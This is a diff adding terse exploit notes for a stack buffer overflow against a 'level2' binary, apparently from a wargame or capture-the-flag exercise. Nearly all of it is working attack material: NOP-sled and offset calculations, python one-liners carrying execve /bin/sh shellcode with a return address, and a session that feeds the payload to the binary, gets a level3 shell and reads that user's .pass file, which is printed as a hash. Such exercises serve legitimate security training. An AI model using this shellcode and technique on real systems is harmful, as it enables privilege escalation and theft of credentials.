@@ -1,0 +1,29 @@
+ret pointer offset += 88 off $esp
+
+# not working
+noop | payload | noop | addr
+30 + 34 + 16 + 8 = 88
+
+addr = 0xbffff6fc
+
+python -c 'print("\x90"*30 + "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68" + "\x90"*16 + "\xfc\xf6\xff\xbf")'
+
+
+# working hopefully
+noop | payload | noop | addr
+30 + 21 + 29 + 8
+
+strdup return address = 0x804a008
+
+python -c 'print("\x90"*30 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*29 + "\x08\xa0\x04\x08")'
+
+
+```sh
+$> python -c 'print("\x90"*30 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*29 + "\x08\xa0\x04\x08")' > /tmp/payload
+
+$> cat /tmp/payload - | ./level2
+$ whoami
+level3
+$ cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
